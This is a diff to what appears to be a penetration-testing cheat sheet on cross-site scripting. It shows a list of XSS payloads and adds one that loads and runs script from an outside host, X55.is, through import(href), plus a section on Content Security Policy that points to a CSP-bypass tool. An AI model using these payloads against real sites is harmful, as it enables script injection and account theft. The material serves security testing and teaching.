@@ -127,6 +127,7 @@ Generally we will use following payloads as a proof of concept. It will open an 
 <IMG SRC=JaVaScRiPt:alert('XSS')>
 <IMG onmouseover="alert('XSS')">
 <<SCRIPT>alert("XSS");//<</SCRIPT>
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
 
 // Useful payloads
 <K OnPointerRawUpdate=alert(1)>
@@ -197,6 +198,16 @@ Run the function and copy result (charcode) to our final payload
 ```html
 <script>eval(String.fromCharCode(121,19,32 [...] 120,95,42,31))</script>
 ```
+{% endtab %}
+{% endtabs %}
+
+### CSP
+
+CSP is a browser security mechanism that aims to mitigate [XSS](https://portswigger.net/web-security/cross-site-scripting) and some other attacks. It works by restricting the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages. To enable CSP, a response needs to include an HTTP response header called `Content-Security-Policy` with a value containing the policy. The policy itself consists of one or more directives, separated by semicolons.
+
+{% tabs %}
+{% tab title="CSPBypass" %}
+[**CSPBypass.com**](https://cspbypass.com/), is an [open-source tool](https://github.com/renniepak/CSPBypass) designed to help ethical hackers bypass restrictive Content Security Policies (CSP) and exploit XSS (Cross-Site Scripting) vulnerabilities on sites where injections are blocked by CSPs that only allow certain whitelisted domains.
 {% endtab %}
 {% endtabs %}
 
